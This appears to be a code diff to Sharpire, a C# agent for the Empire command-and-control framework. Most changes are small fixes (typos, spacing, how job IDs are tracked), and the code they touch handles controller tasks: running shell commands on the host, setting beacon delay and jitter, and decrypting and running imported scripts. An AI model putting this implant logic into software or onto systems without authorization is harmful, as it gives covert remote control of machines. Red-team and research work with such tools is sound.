@@ -230,7 +230,6 @@ namespace Sharpire
                         string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
                         SendMessage(EncodePacket(2, message, packet.taskId));
                         Environment.Exit(0);
-                        //This is still dumb
                         return new byte[0];
                     case 40:
                         string[] parts = packet.data.Split(' ');
@@ -240,7 +239,7 @@ namespace Sharpire
                             Console.WriteLine("Current delay" + sessionInfo.GetDefaultDelay());
                             sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                             sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
-                            output = "Delay set to " + parts[1]+ "Jitter set to "+ parts[2];
+                            output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
                         }
                         else if (1 == parts.Length)
                         {
@@ -248,7 +247,7 @@ namespace Sharpire
                         }
                         else
                         {
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
+                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ", parts.Skip(1).Take(parts.Length - 1).ToArray()));
                         }
                         byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
@@ -277,11 +276,11 @@ namespace Sharpire
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task101(packet);
                     case 110:
-                        string jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
-                        jobTracking.jobs[jobId].Status = "running";
-                        return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
+                        jobTracking.StartAgentJob(packet.data, packet.taskId);
+                        jobTracking.jobs[taskId.ToString()].Status = "running";
+                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
                     case 111:
-                        return EncodePacket(packet.type, "Not Implimented", packet.taskId);
+                        return EncodePacket(packet.type, "Not Implemented", packet.taskId);
                     case 120:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task120(packet);
@@ -298,6 +297,7 @@ namespace Sharpire
                 return EncodePacket(packet.type, "Error running command: " + error, packet.taskId);
             }
         }
+
 
         private byte[] GenerateRunningJobsTable(PACKET packet)
         {
@@ -734,8 +734,8 @@ namespace Sharpire
         {
             byte[] scriptBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), jobTracking.ImportedScript);
             string script = Encoding.UTF8.GetString(scriptBytes);
-            string jobId = jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
-            return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
+             jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
+            return EncodePacket(packet.type, "Job started: " + packet.taskId, packet.taskId);
         }
         //Decompress function may want to move this somewhere else at some point
         //taken from Covenant https://github.com/cobbr/Covenant/tree/master/Covenant
